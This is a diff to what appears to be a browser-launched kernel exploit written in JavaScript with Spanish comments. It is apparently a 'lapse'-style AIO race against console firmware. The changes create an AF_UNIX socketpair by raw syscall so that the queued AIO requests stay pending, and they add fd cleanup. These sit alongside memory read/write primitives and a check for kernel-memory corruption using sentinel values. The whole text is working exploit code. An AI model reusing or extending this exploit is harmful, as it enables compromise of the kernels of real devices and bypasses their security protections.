@@ -115,9 +115,22 @@
     // ===== FASE 1: crear N requests AIO validas =====
     // reqs[i] layout (lapse): [{+0x20} = fd/objetivo]. Los ids los devuelve
     // aio_submit_cmd en ids[i] (4 bytes c/u), con flag MULTI.
-    say("F1: crear " + NREQ + " requests AIO (multi-read)");
+    // [Mods 13.60] El fd debe tener lectura PENDIENTE (asi el request queda
+    // vivo y con waiters, como hace lapse con sockets). fd=0 no existe en el
+    // sandbox del browser -> socketpair(AF_UNIX) y leemos de un extremo vacio.
+    say("F1: crear " + NREQ + " requests AIO (multi-read, lectura pendiente)");
     const reqs = malloc(REQ_BYTES * NREQ);
-    for (let i = 0; i < NREQ; i++) write32(reqs + BigInt(i * REQ_BYTES + 0x20), 0n);
+    let fdTarget = 0n, fdPair = -1n;
+    const sv = malloc(8);
+    const qsp = SC("SOCKETPAIR_0x35", 0x35n, [1n, 1n, 0n, sv], "(AF_UNIX,SOCK_STREAM,0,sv)");
+    if (qsp.r >= 0n) {
+        fdTarget = BigInt(Number(read32(sv)));
+        fdPair = Number(read32(sv + 4n));
+        say("F1 socketpair ok: fdA=" + fdTarget + " fdB=" + fdPair + " (lectura pendiente)");
+    } else {
+        say("F1 socketpair fallo (" + VS(qsp) + ") -> fallback fd=0 (probable EBADF en submit)");
+    }
+    for (let i = 0; i < NREQ; i++) write32(reqs + BigInt(i * REQ_BYTES + 0x20), fdTarget);
     const ids = malloc(4 * NREQ);
     for (let i = 0; i < NREQ; i++) write32(ids + BigInt(i * 4), 0n);
     const states = malloc(4 * NREQ);
@@ -223,6 +236,8 @@
     say("F5: limpieza");
     SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
     SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
+    if (fdTarget > 0n) { try { syscall(SYSCALL.close, fdTarget); } catch (e) {} }
+    if (fdPair >= 0n) { try { syscall(SYSCALL.close, fdPair); } catch (e) {} }
 
     const post1 = read64(decTarget1), post2 = read64(decTarget2);
     const decHit = (post1 !== 0x4141414141414141n) || (post2 !== 0x4242424242424242n);
